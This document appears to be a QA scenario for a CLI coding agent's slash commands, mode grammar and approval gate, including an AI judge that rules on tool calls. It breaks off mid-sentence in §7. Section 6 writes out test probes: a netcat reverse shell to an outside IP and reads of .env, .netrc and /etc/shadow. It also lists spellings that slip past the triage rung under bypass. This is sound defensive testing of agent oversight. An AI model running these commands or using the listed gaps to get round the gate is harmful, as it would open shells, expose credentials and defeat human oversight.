# Scenario: every command at the `you>` prompt

**What it exercises:** `Command::Registry` and the fourteen commands nothing else drives, `/help`,
`/pin`, `/unpin`, `/keep`, `/btw`, `/rewind`, `/undo`, `/fork`, `/goal`, `/meta`, `/review-submit`,
`/introspect`, `/stop` and `/qa`, alongside the eleven that other scenarios touch only in passing (`/status`,
`/sessions`, `/mode`, `/model`, `/approve`, `/quit`, `/ruby`, `/inbox`, `/review`, `/survey`,
`/implement-epic`). Fourteen plus eleven is the whole registry, twenty-five commands (round 20 found this line
saying twenty-three: `/qa` and `/stop` were added), pinned as a literal roster in
`spec/lain/cli/command/surface_spec.rb` ("registers the whole shipped command set"). Count `/help`'s
rows against 25 rather than trusting this number (round 25: `/help` lists 25; re-derive the count from the registry each
round). `/implement-epic` is driven end
to end by `epic-tier.md` §10; here it only has to appear in `/help` and refuse by name outside an
epic.

**The question it answers:** does the command surface do what it says, and does it refuse in
sentences a human can act on? Every command below is a **zero-model-turn** path — the registry is
consulted BEFORE the skill middleware, so a registered `/word` runs with no provider round trip at
all. That makes this the cheapest scenario in the set and the one with the highest refusal density.

**Cost:** cheap. §1–§6 need no model call. §7 (`/goal`) and §8 (`/meta`) each need a live model, and
§7 is the only place a **loop** is driven.

**Needs:** `bench.md` up for §7–§8. tmux for `/btw` and `/fork` (both open panes). nvim not
required.

**Read `method.md`'s standing rule about the approval level first.** A launched chat starts in `auto`:
a judge answers the gated calls it is sure of, and only an unsure one parks. State the level you run
under at the top of the round. Never raise it to `bypass`, because that answers every question the
method exists to ask. §6 is the one place that drives `bypass`, on a throwaway tree, and it ends with
`/mode !`, which lands on `ask`. Do not carry a raised level into another section.

---

## 0 — The registry itself, and precedence

**Precedence is command-first, by design.** A registered `/word` runs as a command; prose, a path,
`@role[/skill]` and an **unregistered** `/word` all fall through to skill dispatch unchanged.

```
you> /help
you> /nosuchcommand arg
you> @reviewer[/critique] look at lib.rb
you> /create-plan something
```

`/help` holds the **live** registry, so its listing is the authority: check every command driven
below appears in it, and that nothing appears in it that has no implementation. Registration order
is the listing order — a `/help` sorted alphabetically has been re-sorted somewhere, and that is a
small finding worth recording because it means a second ordering exists.

**`/nosuchcommand` refuses by name — it does NOT reach the model, and this paragraph said the
opposite until round 14.** An unregistered `/word` produces `unknown skill "nosuchcommand", expected
one of [...]` with the journal unchanged; bare prose is what reaches the model. Measured with a
control (round 14: journal 55->55 on the slash form, 55->62 on the same words without the slash),
and `spec/lain/middleware/skill_dispatch_spec.rb:103` pins it by name -- "an unknown skill is
reported, not sent to the model". A silent fallthrough would be the `StringInquirer` shape this
codebase rejects: a typo answered quietly. What the fallthrough still protects is the *skill*
namespace -- a registered skill's `/word` dispatches, and only an unknown one refuses.

**`/qa` is listed twice in `/help`:** it is both a registered command and a skill name, and the command wins, so the skill is
not reachable by name. Record that as the known shape, not a missing implementation.

**The one collision guarantee** is a wiring-time refusal, not a last-write-wins — two commands
claiming one name raise at assembly. Nothing a driver types can provoke it, so note it as
spec-covered and move on rather than hunting for it.

## 1 — `/status`, `/sessions`, `/model`, `/mode`, `/introspect`

The read-only five. Drive each before any turn is committed, and again after — an empty session is
where these break.

```
you> /status
you> /sessions
you> /model
you> /mode
you> /introspect
```

**`/introspect` is the human-facing half of a pair whose model-facing half is `session_usage`** —
drive it in both states, because it exists to answer a question honestly rather than plausibly.
Before any turn: occupancy reads `no turn measured on this chain in this run` (the wording since round 22;
"no turn yet in this run" is stale) and review reads "none held by /review or
/survey". After a turn: occupancy is a percentage, the token rows are populated, and the cache-hit
row reads a ratio or "nothing billed on the way in yet" if nothing was. **Check the `unreported`
row names all three gaps by word, every time**, each on its own indented row beneath it:

- `provider` — *which provider is answering, and where it is running*
- `window` — *how large this run's context window is, and whether that size was measured or assumed*
- `reviews` — *a review the agent opened for itself -- only rounds from /review and /survey show above*

The `window` gap is the one to read twice now that an over-window 400 can **vouch** for a real
size (`session-and-window.md`): `/introspect` still cannot see which of the two it got, so it must
keep saying so rather than quietly reporting a number. The `provider` gap likewise survives the
run profile — the profile is recorded in the session **header**, which this command does not read.
Read the recorded backend out of the header instead:

```bash
head -1 "$LAIN_QA_JOURNAL" | ruby -rjson -e 'r=JSON.parse(STDIN.read)
  puts r.values_at("provider","model","api_base","num_ctx","num_batch").inspect'
```

A row that goes quiet instead of naming its gap, or a number that looks measured but was guessed, is
the failure this command exists to catch — read `cli/command/introspect.rb`'s class doc for the
fabrication this was written against. The `scope` row is the same discipline applied to the token
totals: this run only, every model it called.

**A mode is scope × approval.** `/mode` reports the scope, the approval level and the active layers.
Scope is `checkout` or `plan`; approval is `ask`, `auto` or `bypass`; the layers are `goal`, `notify`
and `vi`. A launched chat is `checkout auto`, and `--approval ask|auto|bypass` seeds another. The old
posture ladder is gone, and `manual` and `accept_edits` are no longer words at all, so each is refused
as an unknown token and the answer names the whole grammar:

| typed | answered |
|---|---|
| `/mode manual` | `error: unknown /mode token "manual" -- /mode takes ask, auto, bypass, checkout, plan, !, +layer and -layer (layers: goal, notify, vi)` |
| `/mode accept_edits` | the same, naming `"accept_edits"` |
| `/mode +auto_approve` | `error: unknown mode layer "auto_approve", expected one of [:goal, :notify, :vi]` |

The `auto_approve` layer and the `--auto-approve` flag are **gone**: asking a model first is approval
`auto` now, in front of the human rather than racing them. `lain chat --auto-approve` must be refused
by Thor as an unknown switch. Any older drive that quotes an `accept_edits: ...` answer or an `AA`
lighter is history; the same drive today answers `checkout auto: ...` or `checkout ask: ...`.

**`goal`, `vi` and `notify` are wired too, since the same chunk's last two cards (`4c8089ab`).**

- **`goal` is the driver's layer.** A standing goal raises it, every stop (done, cap, `/goal off`)
  lowers it, and `/mode` may not fake it. *Driven 2026-09-14* in a `--no-nvim` chat with no goal
  standing: `/mode +goal` → `error: the goal layer shows a standing goal, and none is set -- /goal
  <objective> sets one and raises it`, and `/mode -goal` answered `accept_edits: no layers active ->
  accept_edits: no layers active` — nothing to lower. With a goal standing, `/mode -goal` stops the
  goal as `/goal off` does; §7 drives the layer against the driver.
- **`vi` drives the line editor at the next read**, and lowering it writes back exactly the settings
  the session had before, so an operator's own inputrc choice survives. *Driven 2026-09-14* in a
  tmux pane: `/mode +vi` → `accept_edits: no layers active -> accept_edits: vi (VI)`, and the next
  prompt read `qwen3-coder:30b VI idle 0s` over `[ins]you>`; `Escape` turned it to `[cmd]you>`;
  `/mode -vi` → `accept_edits: vi (VI) -> accept_edits: no layers active` and the prompt was a plain
  `you>` again. A session that never raises the layer must never have its editing mode set by lain.
- **`notify` rings the terminal, and nothing else.** Its lighter is **`BELL`**, where it read
  `NOTIFY` — a word a desktop notifier would answer to, and that notifier was deleted in `c40ab419`.
  While it stands, a question, approval or review arrival line writes one terminal bell byte and,
  inside `$TMUX`, a `tmux display-message` carrying that line; outside a terminal and tmux nothing
  runs. *Driven 2026-09-14*: `/mode +notify` → `accept_edits: no layers active -> accept_edits:
  notify (BELL)`, and `/mode -notify` back. `cockpit-surfaces.md` §5 drives the bell itself —
  including that a `--no-nvim` chat's inline `[y/N]` is not an arrival line and does not ring.

`/help` describes the command, not the values: `/mode [scope] [approval] [+layer] [-layer] [!] --
show the mode, switch its scope or approval, toggle a layer, or reset`.

Drive the full grammar:

```
you> /mode +notify         enable one layer, both axes unchanged
you> /mode -notify         disable it
you> /mode +nosuchlayer    must name the three valid layers
you> /mode plan            move the scope
you> /mode checkout        move it back
you> /mode plan ask        both axes in one command, one record
you> /mode ask auto        refuses whole, naming the approval axis twice
you> /mode plan checkout   refuses whole, naming the scope axis twice
you> /mode nosuchmode      must name the values of one axis
you> /mode manual          refuses as an unknown token, naming the grammar
you> /mode !               reset -- ask approval, NO layers, then plan scope
```

**Two tokens naming the same axis refuse whole and name both.** This is the fix for round 18's
P46, where `/mode` took the last of contradictory tokens and `/mode accept_edits auto` landed
silently on the approve-all rung. `/mode plan checkout` is the contradiction to drive, safe in every
direction. `/mode ask auto` is safe too, since it refuses before anything lands, but never type
`bypass` in a grammar probe.

**`/mode !` is a reset, not a step**, and the design note says why it leads: like `<Esc><Esc>` in
vim, its promise is that afterwards you know where you are and that nothing is being decided
behind you. It lands **`ask` approval and no layers first**, because dropping `bypass` or a
surviving layer is the part that cannot wait, and a reset is the move that puts a human back in the
loop, so it lands on `ask` and not on the launch default `auto`, and then enters `plan`, the most confined
scope there is. Raise two layers, then `!`, then `/mode`: the report must show `plan` scope, `ask`
approval and **no** layers. A reset that keeps a layer is the finding.

f25-5 is fixed (T19): `/mode !` in a repo with no commits now says `this repository has no commit yet; make one, then /mode plan`, once, instead of the raw `git read-tree` error. Other spike git failures (`plan scope could not commit ...`) still repeat the prefix; that is not fixed and no card owns it.

**A reset in a repository where no spike can be cut still lands everything else**, in the
checkout, and says why. And a reset **mid-turn** lands the approval and the layers immediately
while the scope move waits: the answer says the move waits until the turn in flight ends. A plain
`/mode checkout` or `/mode plan` mid-turn is refused outright — a running tool call may still be
writing where the session's writes would stop landing.

**And check the switch writes ONE record, not an intermediate ladder.** Tokens fold over one mode
and switch once, so `/mode plan ask +notify` is a single `mode_switch` naming where the session
started and where it ended. Two records for one command means a mode the session was never really
in reached the file, and every later fold reads it as real. A `/mode` naming the mode already in
force writes **nothing at all** — journalling a no-op switch is the other half of the same defect.

**The prompt itself shows the mode, and it must follow `/mode` at the very next prompt.** This is
the half that had no check: `/mode` reporting correctly while the prompt shows a stale mode is two
surfaces disagreeing about the same state, which is the class of defect this whole scenario exists
for. Drive `/mode plan`, then look at the prompt *before* typing anything else, then `/mode !` and
look again. In a cockpit that prompt is in the **input pane**. The wiring hands the prompt composer
the **live** mode switch rather than a snapshot precisely so this works.

**`checkout` and `auto` both carry an empty lighter**, so the launch default's prompt is
byte-identical to one with no mode support at all. `plan` (`PLAN`), `ask` (`ASK`), `bypass`
(`BYPASS`) and the layers show. That is deliberate, not a missing segment, and a chat that shows
`ASK` with no one having asked for it is the finding.

**The record's shape.** A `mode_switch` names both axes on both sides plus both layer sets:

```bash
ruby -rjson -e 'ARGF.each_line{|l| r=JSON.parse(l) rescue next; next unless r["type"]=="mode_switch"
  puts "#{r["from_scope"]}/#{r["from_approval"]}#{r["from_layers"]} -> " \
       "#{r["to_scope"]}/#{r["to_approval"]}#{r["to_layers"]} (#{r["surface"]})"}' "$JOURNAL"
```

It names **no toolset**, and that is the point rather than an omission: a mode never changes what
the model is shown, so the session header's declared set stands for the whole run and a flip
cannot move the tool block a prompt cache keys on. A `toolset_digest` on this record would be a
regression toward the posture model. Check instead that the header's toolset digest is unchanged
across a session that flipped the scope.

## 2 — `/pin` and `/unpin`

The compaction lever, and the only commands that take a **turn digest**.

```
you> /pin                  before any turn: "nothing to pin: this session has no committed turns"
```

Then ask something, and:

```
you> /pin                  no argument -- the last assistant turn
you> /pin <4+ hex prefix>
you> /pin abc              "abc" is too short to name a turn (4 characters minimum) -- <grammar>
you> /pin zzzzzzzz         no turn matching "zzzzzzzz" on this session's chain -- <grammar>
you> /unpin <same prefix>
you> /unpin <never pinned> should refuse, not silently succeed
```

*Driven 2026-09-14:* `/mode +nosuchlayer` → `error: unknown mode layer "nosuchlayer", expected one
of [:goal, :notify, :vi]`. The bare-token refusal names the whole grammar rather than one roster:
`/mode nosuchmode` → `error: unknown /mode token "nosuchmode" -- /mode takes ask, auto, bypass,
checkout, plan, !, +layer and -layer (layers: goal, notify, vi)`. The two retired words get that same
answer. **A typo in the third token abandons the first two**: the fold is guarded whole, nothing is
written, and the mode in force is still the one on the prompt — check that after
`/mode plan +notify nosuchmode`.

**Every refusal on the digest path says the grammar out loud.** That is deliberate and it is the
thing to check: a refusal that says only "no turn matching …" leaves a human guessing whether they
typed a prefix, a full digest or an index. Confirm the grammar sentence is present on **all four**
refusals above, including the ambiguity one:

```
you> /pin <a 4-char prefix matching two turns>   -> "…is ambiguous on this session's chain: <a, b>"
```

Manufacture the ambiguity deliberately — run enough turns that two digests share four hex characters,
or pick a shorter shared prefix. It is the one refusal that cannot be provoked by typing nonsense,
and so the one most likely never to have run. **Round 17 measured the cost: no 4-hex collision in
116 turns, so reaching it takes on the order of 300.** A "shorter shared prefix" is refused as too
short before the ambiguity check runs, so budget the turns or record it as not reached.

**Round 23 K23-1, fixed: pin the FIRST turn, under `summarize-conversation`.** The pin-effect check below is the only one that
finds it. Launch `--compact-bytes 1500 --compact-keep 2 --compact-strategy summarize-conversation`, `/pin` the digest of
the first prompt, then ask a few questions that each produce a few KB. Expect a `compaction` once a conversational run
of 2 or more exists, the pinned first turn kept verbatim through it, and no stretch of `compaction_decision` records
reading `would_not_shrink true` with `summary_hits 0` while the head grows. Before the fix the pin made the strategy
claim nothing, 42 decisions deferred, and only `/unpin` unblocked it. A run that is all tool rounds under that strategy
alone still has nothing to claim; its decision then names the strategy and `elide-tools+summarize-conversation`
(`rails-blog.md` section 1).

On qwen3-coder the model calls `ask_human` after each answer (round 25), which makes every turn a tool round, so this
check reads `nothing_droppable` instead of a compaction. Tell it not to ask, or record the check as model-blocked.

Success messages carry a 19-character digest prefix and the inverse command:
`pinned <digest>... -- compaction keeps this turn (/unpin to release it)`. **Then verify the effect,
not the message.** Pin a turn, drive enough volume to force a compaction (or set the threshold low),
and confirm the pinned turn survives while its neighbours are elided. A `/pin` that reports success
and does not protect the turn is the failure this section exists for, and the message alone cannot
show it.

## 3 — `/rewind`

Moves the head. It is the only command that makes the session shorter, so its refusals matter more
than most.

```
you> /rewind               with no committed turns: "nothing to rewind: …"
you> /rewind 1
you> /rewind 999           "/rewind 999 is out of range; this session holds N …"
you> /rewind <head prefix> "…is already the head; nothing to rewind"
you> /rewind <ambiguous>   the ambiguity refusal again
```

**The one that has to be driven deliberately: `/rewind` while a call is parked.** Round 17 found the
three doors disagreeing (F96): at `human>` with the parent's own `ask_human` parked, `/fork` refused
("may still be making that call"), `/undo` refused ("a turn is in flight"), and `/rewind 3` answered
`rewound 3 turns: …` — then answering the question **re-committed all three rewound turns** on top
of the new head, and the next request carried them. Since 2026-09-14 `/rewind` shares `/undo`'s
in-flight predicate and refuses while any run holds the dispatch lock, naming the parked call and
restating what the human typed:

    /rewind 3 refused: this turn's 1 tool call is still in flight (ask_human), and settling it would commit its turns over a rewound head. Nothing moved -- answer or stop it, then rewind.

Round 26 drove it and found the refusal listing every call of a 3-call head as parked, in the singular. Now (f26-3
fixed, T17) the sentence is `Command::Rewind#in_flight`: it counts the turn's tool calls and names them, `this turn's
3 tool calls are still in flight (echo, echo, ask_human)`, with "call is" for 1; it carries no call ids. When the head
is not a pending `tool_use` it names `a run` instead. Manufacture it the way round 17 did — park the
parent's own `ask_human` — and in a cockpit type `/rewind` at the `command>` reader
(`cockpit-surfaces.md` §5b). Then answer the question and confirm **no** rewound turn comes back:
the journal gains the answer and the model's reply, never a second copy of turns already on the
chain.

**The digest form keeps the human's own words.** Round 17's `/rewind b7a9` onto an assistant
`tool_use` turn refused as `/rewind 1 lands on …`, restating a count nobody typed (F122). The
refusal now quotes what was typed — `/rewind b7a9 lands on an assistant tool_use turn; its tool
results would be rewound past, and the next request would dangle the call (nearest valid targets:
…)`; round 26 measured `/rewind b6422dad lands on an assistant tool_use turn; ... (nearest valid targets: 35, 37)`. That shape shares its vocabulary with `/fork`'s `MID_TOOL` door
and with `failure-injection.md` §2's torn head; check all three say the same thing about the same
shape, because three different sentences for one state is how a human learns to distrust all of
them.

**`/rewind` onto a stranded prompt lands on its parent** (round 22). When the turn the count lands on is a
prompt whose ask never got an answer (a stop or a pre-wire failure left it), the head would fold into the next
line and replay the side effects the rewind just dropped, so the rewind goes one turn further and says so:
`1 more turn was dropped so the head is not a stranded prompt: "<the prompt's first 60 characters>"`. Drive it
after a `/stop`, rewind to just that prompt, and check the extra line and that the next request carries neither
the prompt nor its folded text.

After a successful rewind, confirm the **next** turn's request does not contain the rewound
content. The head moving in the display while the context still carries the discarded turns is the
worst version of this bug and is invisible without reading the request.

## 3b — `/undo`, which moves files while `/rewind` moves the conversation

**The pair is the point, and mixing them up is the finding.** `/rewind` shortens the session and
leaves the working tree alone; `/undo` puts back the files the last file-changing turn wrote and
**never moves the Timeline**. Drive them in the same session and confirm each leaves the other's
territory untouched: a `/undo` that shortens the chain, or a `/rewind` that reverts a file, is a
serious defect and neither is visible if you only ever drive one.

`/undo` names a turn by its **place among the file-changing turns**, never by a digest — deliberate,
because a digest is not something a human can act on here. Typed again it walks one turn further
back.

```
you> /undo                 before any file-changing turn: "nothing to undo: no turn has changed
                           a file this session recorded"
you> /undo nonsense        unknown /undo argument "nonsense": type /undo, or /undo skip
```

Then have the model write two files in two separate turns, and:

```
you> /undo                 "undid the latest of 2 undoable file-changing turns: restored <paths>"
you> /undo                 "undid the only undoable file-changing turn: …"
you> /undo                 back to "nothing to undo"
```

**Check the count is of turns still undoable, not of turns that ever existed.** A count that takes
in turns already undone reads "2 of 3" with two left, and the class doc says so explicitly — after
the first `/undo` above, the second must say *the only*, not *the latest of 2*. Once the last turn is undone or skipped it says `nothing to undo: no file-changing turn is left` (f26-5 fixed, T18: one sentence true both for a session that never changed a file and for one whose changes are all undone).

**Verify the effect, not the message**, as with `/pin`: read the files. Both directions must work —
a turn that **created** a file has that file **deleted** by the undo, and a turn that **deleted** one
has it restored. The success line distinguishes them (`restored …; deleted …`), and a turn needing
neither says `no file needed putting back` rather than claiming a move.

### The refusals, which are where this command earns its keep

Every one lands **before anything moves**, and the last sentence of the blocked refusal says so
(`Nothing was changed.`) — confirm that is true by reading the tree after each refusal, because a
refusal that has already half-applied is the worst failure available here.

1. **A turn in flight.** `cannot undo while a turn is in flight: a tool call may still be parked, and
   it could write after the files are put back`. Manufacture it while an approval sits parked — in a
   cockpit, type `/undo` at the `command>` reader, which runs commands while the line dispatches.
2. **A live supervised worker.** `cannot undo while <role> (<worker_id>) is still running and may be
   writing; let it settle or stop it first` — and it must **name** the worker, role and id both. Drive
   it with a subagent running (`subagents-and-backends.md` has the launch).
3. **A blocked path.** The refusal names **each** path and why, from a closed list of seven reasons:
   `dirty` (changed since that turn), `symlink`, `directory` (something in the way the turn did not
   make), `outside_root`, `ignored` (`.gitignore`'d, so nothing recorded what it held), `unrecorded`
   (`was written by that turn, but nothing recorded what it held before lain first wrote it`),
   `nested_repository`. The cheap three to provoke by hand are
   **dirty** (edit the file yourself before undoing), **symlink** (replace it with one) and
   **directory** (`rm` the file and `mkdir` its path).

**And the way past a refusal, which is the design ruling to check.** A refusal with no escape would
wedge every *later* undo — so the blocked refusal offers `/undo skip`, which drops that turn without
restoring anything:

```
you> /undo skip            "skipped <place> without restoring anything: its changes stay on disk,
                           and /undo now reaches the turn before it"
```

Confirm the two halves of that sentence are both true: the files it would have restored are
**still on disk**, and the next `/undo` reaches the turn *before* the skipped one. A `skip` that
restores anything, or that leaves the log pointing at the same turn, defeats the whole escape.

**The write-set scope can put a turn back now, and round 17 found it could not.** Under the
write-set snapshot scope nothing recorded a path's state before a turn first wrote it, so
**every** created file and every first overwrite of a tracked file refused as `unrecorded` — worded
then as "first written in that turn", which was false for a committed file — and after a mode
change the refusal blamed paths the turn never touched (F107). Since 2026-09-14 `write_file` and
`edit_file` record a pre-image (absent, or the bytes) the first time a turn writes a path, and
`/undo` reads it. The four checks below are *(predictions, not yet driven)*, and since round 18
the write-set scope is a **fallback** rather than something a mode selects, so reaching them means
degrading the shadow store deliberately rather than typing a `/mode`:

- a turn that **created** `x.txt` → `/undo` deletes it and the reply names it as deleted;
- a turn that overwrote a **committed** `keep.txt` → `/undo` restores its committed bytes;
- shadow-git turns writing `c.txt`, then one write-set turn writing only `e.txt` → `/undo` names
  `e.txt` and **no other path**;
- the shadow-git undo is unchanged.

`unrecorded` is now left for a path a turn wrote by a route the tools did not see first — a `bash`
redirection is the one to try.

**Round 18 cut the last link between the mode and the snapshot scope.** Every mode now writes
under **shadow-git**, and the write-set scope is reached only as the slot's own fallback when the
shadow store fails. So a round cannot switch scopes by typing a mode, and the caveat above is a
report of a degraded shadow store rather than of a posture. Read it off the reply; do not infer a
scope from `/mode`.

**One scope caveat to read in the output, not in the code.** A turn recorded under the **write-set**
scope appends `Only files lain's own tools wrote were restored: that turn ran under the write-set
scope, which records nothing a shell did.` Confirm the caveat appears on a write-set turn and
**not** on a shadow-git one. A caveat printed unconditionally is as bad as one never printed: it
teaches a human to distrust a complete restore.

**The journal carries two records, and which one appears is the assertion:** `workspace_undone`
(with `turn`, `snapshot`, `written`, `deleted`) for a revert, `workspace_undo_skipped` (`turn`,
`snapshot`) for a skip. Unlike `/rewind`, the record is written **after** the files move, on purpose:
a pointer move cannot fail but a file write can, so the record names what actually landed. Kill the
process mid-undo if you can arrange it; a `workspace_undone` naming paths that are not on disk is
the failure that ordering exists to prevent.

## 4 — `/fork`, `/btw`, `/keep`

Three commands about session lineage, and they interlock — `/btw` opens an ephemeral session,
`/keep` promotes it, `/fork` branches a durable one.

```
you> /fork                 before any turn: "cannot fork: no turns are recorded yet, so there is no head to fork -- ask something first, then /fork"
```

and under `--no-journal`:

```
cannot fork: this session has no durable journal (--no-journal), so there is no record on disk for a child to fork from
```

**The mid-tool door, and read its hedge carefully.** With a parked question and a head that is an
assistant `tool_use` turn, `/fork` refuses with a sentence that says the session **"may still be
making that call"**. The hedge is the point: what the door sees is a parked question, not a running
tool, and those coincide at `human>` and come apart at `you>`. An earlier draft asserted the call
*was* still being made — a fact the door does not have. **A refusal that has regained the confident
phrasing is a regression**, even though it reads better.

Then `/btw`, which opens a tmux popup running an ephemeral fork:

```
you> /btw                          empty question -> "usage: …"
you> /btw what does Canonical do?
```

Inside the popup:

```
you> /btw again                    "already inside an ephemeral /btw session -- /keep this side-question first …"
you> /keep                         -> "kept: <file> -- now a durable chained fork (lain sessions lists it)"
```

With no attached client (no tmux to open a popup in), `/btw` prints a runnable `lain chat --btw --fork ...` command
instead (round 25). It works when run by hand.

and the two `/keep` refusals, each of which needs setting up:

- **actors still running**: `wait for the turn to settle: actors still running (<roles>) -- promotion …`.
  Spawn an actor in the ephemeral session, then `/keep` immediately.
- **not ephemeral**: `<file> is not ephemeral; only a --btw session needs /keep`. Type `/keep` in an
  ordinary session.

Close the loop: after `/keep`, `lain sessions` must list it, and `lain chat --resume <it>` must
open it with the side-question's turns present. **`--resume` continuing a session and carrying the
conversation over is not checked anywhere else** — `failure-injection.md` drives it as a refusal and
`bowling-ruby.md` as a rebuild. This is the one place it is driven as a *continuation*, so ask a
question whose answer depends on the earlier turns and check the model actually has them.

Driven for the first time in round 26: `/btw` with no client printed a runnable command that inherits the recorded provider and model; `/keep` gave a durable chained fork; `--resume` recalled the parent's and the side session's code words, and not a turn rewound before the fork.

## 5 — `/review-submit`, with nothing to submit

```
you> /review-submit        with nothing open
you> /survey ./lib
you> /review-submit        with a SURVEY open -- a survey has no pull request
```

Two distinct refusals; "nothing is open" and "there is nowhere to post" have nothing alike as
remedies and must not share a sentence. `changeset-review.md` §7 drives the third case (a local
branch review) and the no-network check; do not repeat it here.

## 6 — `/mode bypass` and the `auto` judge: what each level does to the gate

`bypass` is the sanctioned exception to `method.md`'s rule against raising the approval level: it
names an approve-all gate in its heading, runs in a throwaway tree with nothing sensitive in it
beyond the fixture `secret-boundary.md` §0 builds, and ends with `/mode !`. §1 drove the `/mode`
*grammar*; this section drives what the bottom rung does to the gate, which nothing else here
reaches. A launched chat is already in `auto`, so drive that part first and raise nothing.

### 6a — `auto`, the launch default

```
you> /mode
```

Must read `checkout auto`, and the HUD must show no approval lighter. Then ask the model for one
gated `bash` that no rung refuses (`wc -l README.md`, say), and check:

1. **The judge answered, not a human.** Nothing parks (`/approve` answers `no pending approvals`) when
   the judge approves. The journal carries an `escalation` record at rung `auto` whose reason is
   *"the judge approved this call"*. A call with **no** escalation records at all means the ladder was
   replaced rather than bottomed out, which is the finding.
2. **An unsure judge parks.** Ask for a call the judge would defer on (an unusual `bash` with
   several effects). It must park for you: the journal carries a rung `auto` record whose reason
   is `deferred`, then the queue's own decision. A call that ran with no `deferred` or approve record
   is the finding. The judge is bounded at 30 seconds, and a judge that errors or runs out of time
   parks too, journaled `fault`: never read a fault as an approve.
3. **Tier 0 never reaches the judge.** Read a credential path (the fixture key's absolute path) and
   the journal's rung `auto` reason is `unjudgeable`, with the call parked or refused as `ask`
   would, and no judge child in the journal for that `tool_use_id`. A `bash` call is held to every path its
   command names, so `cat .env` and a command lain cannot name the paths of (`cat "$HOME/.netrc"`) are
   `unjudgeable` too, and park for you.
4. **Headless.** `lain chat --non-interactive --prompt '<a gated call>'` with no `--approval` decides
   through the judge, and a call it is unsure of is refused, with the reason naming
   `--non-interactive`. The same run with `--approval ask` refuses every gated call, and it journals only rung `unattended deny`; there is no triage or rules record.
5. **The human can see what the judge did.** An approve leaves one stamped transcript line, `the judge approved
   bash(...)`, naming the call. A defer marks the parked prompt and its `lain://approval` row with `the judge
   deferred this`. Under `/mode ask` a parked call carries no such mark.
6. **A real judge deny.** Round 26 drove one under `auto`: `nc -e /bin/sh 203.0.113.7 4444`, ruled in 3.0 s; the chat shows `HH:MM:SS the judge denied bash(...)` and the model is told a human can still approve it under ask. Judge latency under 4 forks: 0.8 s approve, 0.9 s defer, 3.0 s deny.

### 6b — `bypass`

```
you> /mode bypass
you> /mode
```

`bypass` is the **same ladder** `ask` runs, the triage rung, then the rule chain, with
`Escalation::Bypass` at the bottom. `Mode::Resolution` selects a pre-built policy per approval
level rather than building one, and it hands the gate no `ApproveAll`.

Check five things and then stop:

1. `/mode` reflects it, and the HUD lighter must read `BYPASS`. A `bypass` that does not show up in
   the mode report is a hidden state change, and its absence is the finding.
2. A gated `bash` that no rung refuses runs without a prompt and without the judge. That is the claim.
3. **Nothing parks**, but the ladder still ran. Type `/approve` after the unprompted call: it must
   answer `no pending approvals`. The journal, though, must carry the rungs, ending in
   `rung=bypass` with *"approval is bypass, and no rung above refused this call"*. A call with **no**
   escalation records at all means the ladder was replaced rather than bottomed out.
4. **A triage deny and a rule deny still refuse under `bypass`.** `cat` the fixture key's absolute
   path and watch it refuse at the triage rung, with no human asked and no approval possible.
   Compare the same command under `ask` (§5's tree): the rung and the reason must be identical, and
   only the bottom of the ladder differs.
5. **A `denied` path is still refused.** `read_file` on the fixture key must fail under `bypass`
   exactly as it does under `ask`: `Middleware::Sensitivity` runs *ahead of* the gate, so no
   policy can lift it. Type the path **resolved and absolute**, for the reason `secret-boundary.md`
   §5 gives. The `bash` spelling of the same probe goes through a different rung; drive it there,
   and read §5 before assuming the two answer alike.

**Do not read item 4 as a shell boundary.** Under `bypass` Triage checks the paths lain can name for
certain from a command's words. `cat '/etc/shadow'`, `cd /etc && cat shadow` and a link to `/etc/shadow`
are now refused as an account file under every level, but `sudo cat /etc/shadow`, a `$HOME/..`
spelling, a glob and `cd /etc; cat shadow` are opaque, so they are approved, and only file modes stop
them. `shell-term-approval.md` records the list. `/etc/shadow` as a `read_file` path or a plain
`cat /etc/shadow` is refused as an account file under every level.

One more, if `shell-term-approval.md` has already run in this tree: a command **barred** from
automatic approval by a withheld output gets a *final* deny under `bypass`, telling the human to
switch to `/mode ask` to approve it. There is no queue to park it on, so the refusal has to carry
the way out in words.

Then `/mode !` and confirm the floor is back: `plan` scope, `ask` approval, no layers, before
anything else in the round. **`!` lands in `plan` scope, which confines writes to a spike**, so
type `/mode checkout` to get the round's default back before §7, whose `/goal` drives edits into
the real tree and would otherwise land in the spike rather than where the section is looking.
Type `/mode auto` as well if the rest of the round should run under the launch default.

### 6c — the cycle key

In a cockpit, press **Shift+Tab** in the `lain input` pane. The approval flips `ask` and `auto` (from
`bypass` it goes to `ask`), the HUD shows the change, and the journal carries one `mode_switch`
with surface `key`. **In the pane it flips at once, even mid-run with no prompt open.** In a plain
chat (own terminal) it flips only at a prompt: a Shift+Tab typed mid-run is dropped, not replayed at
the next prompt (a replay is the finding), and a flip redraws the open prompt's header. Known gap, record
it and do not fail it: after a paste containing Shift+Tab the pane row shows `^[[Z`.
`S-Tab` is the one value `keys approval_cycle:` accepts today. A key the user declares is checked at launch and
the launch is refused with the file and line, naming the holder: `keys approval_cycle: "C-x"` reads `approval_cycle
C-x is lain's completion key`, `"C-g"` reads `... is lain's compose key`, and every other `"C-<letter>"` (`"C-t"`, say)
reads `... is held by the line editor ...`. Declaring `"S-Tab"` itself is refused the same way if your inputrc binds
`\e[Z`. Leaving `keys` out never fails a launch: the default Shift+Tab is bound if it can be, and the chat says so
when it cannot. A project `.lain/config.rb` naming `keys` is refused.
In nvim, `:LainMode bypass` from any buffer journals a `mode_switch` from surface `nvim`, and
`:LainMode nosuch` refuses in the editor. Known gap: it does not redraw an open terminal prompt
header; the next prompt shows the new level.

## 7 — `/goal`: the only loop a command starts

```
you> /goal                          with none set: "no standing goal -- /goal <objective> to set one"
you> /goal make lib.rb have a #size method
```

The reply names the three terminating conditions:
`goal set: <objective> -- driving after each turn until GOAL_COMPLETE, the cap, or /goal off`.
**The sentinel is `GOAL_COMPLETE`, not `<DONE>`** — round 17 corrected this line (the model emitted
`<DONE>` first, and that did not end the goal); read it off the reply (`GoalDriver::DONE`) rather
than from this document. **All three must actually terminate it** — drive each in its own session:

| how it ends | how to drive it |
|---|---|
| the model says done | give it a one-step objective it can finish |
| the cap | give it an objective it cannot finish, and count the turns. **On this model the cap is unreachable**: it ends the ask in iteration 1 (round 22), so the cap row cannot be driven live; record it as not reached, or use a stand-in model that never ends |
| `/goal off` | type it mid-drive |

`/goal off` must yield `goal off -- the driver stops re-prompting; type your next line at you>` and
the **next** prompt must actually be a `you>` read, not another driven turn. A driver that gets one
more prompt in after `off` is the finding, and it is exactly the shape that makes a runaway loop
expensive.

**Round 17 found `/goal off` typed mid-drive could not stop the goal** (F105): with a 5-iteration cap,
